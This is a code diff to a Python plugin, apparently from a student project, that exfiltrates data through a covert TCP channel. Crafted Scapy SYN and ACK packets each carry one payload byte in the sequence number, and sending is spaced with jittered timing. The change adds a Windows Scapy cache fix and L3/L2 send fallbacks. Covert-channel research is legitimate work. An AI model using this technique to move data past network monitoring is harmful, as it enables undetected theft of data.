@@ -2,9 +2,21 @@ from __future__ import annotations
 from typing import Dict, Any, Iterable, Optional
 import time, random
 import socket, struct
+import os
+import tempfile
 
 from tfg.plugins.api import ExfilClientPlugin
 from .tcp_common import build_header_bytes, EOT, SEQ_BASE, iter_bytes_from_chunks
+
+
+def _prepare_scapy_cache() -> None:
+    # En Windows Store Python, la ruta por defecto (%USERPROFILE%\\.cache\\scapy)
+    # puede no ser escribible; forzamos una carpeta temporal para evitar WinError 5.
+    if os.environ.get("SCAPY_CACHE_FOLDER"):
+        return
+    cache_dir = os.path.join(tempfile.gettempdir(), "scapy-cache")
+    os.makedirs(cache_dir, exist_ok=True)
+    os.environ["SCAPY_CACHE_FOLDER"] = cache_dir
 
 def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
     if base_ms or disp_ms:
@@ -13,29 +25,41 @@ def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
         time.sleep(t)
 
 def _send_packet(pkt, iface: Optional[str] = None):
-    from scapy.all import send, sendp, Ether, conf, getmacbyip
+    _prepare_scapy_cache()
+    from scapy.all import send, sendp, Ether, getmacbyip
     if not iface:
         send(pkt, verbose=False)
         return
 
-    old_iface = conf.iface
     try:
-        conf.iface = iface
+        # Preferimos L3 porque en Windows Scapy puede no resolver bien alias
+        # "\\Device\\NPF_{GUID}" al asignar conf.iface.
+        send(pkt, verbose=False, iface=iface)
+        return
+    except Exception as l3_err:
         mac = getmacbyip(pkt.dst)
-    finally:
-        conf.iface = old_iface
-
-    if not mac:
-        raise RuntimeError(f"no se pudo resolver MAC para destino {pkt.dst!r} en iface {iface!r}")
-    sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+        if not mac:
+            raise RuntimeError(
+                f"iface {iface!r} no válida/no encontrada para envío L3 "
+                f"y tampoco se pudo resolver MAC para {pkt.dst!r}"
+            ) from l3_err
+        try:
+            sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+            return
+        except Exception as l2_err:
+            raise RuntimeError(
+                f"falló envío RAW en iface {iface!r}: L3={l3_err!r}; L2={l2_err!r}"
+            ) from l2_err
 
 
 def _send_syn(dst, dport, b: int, iface: Optional[str] = None):
+    _prepare_scapy_cache()
     from scapy.all import IP, TCP, RandShort
     pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='S', seq=SEQ_BASE + (b & 0xFF))
     _send_packet(pkt, iface=iface)
 
 def _send_ack(dst, dport, b: int, iface: Optional[str] = None):
+    _prepare_scapy_cache()
     from scapy.all import IP, TCP, RandShort
     pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='A', seq=SEQ_BASE + (b & 0xFF), ack=1)
     _send_packet(pkt, iface=iface)
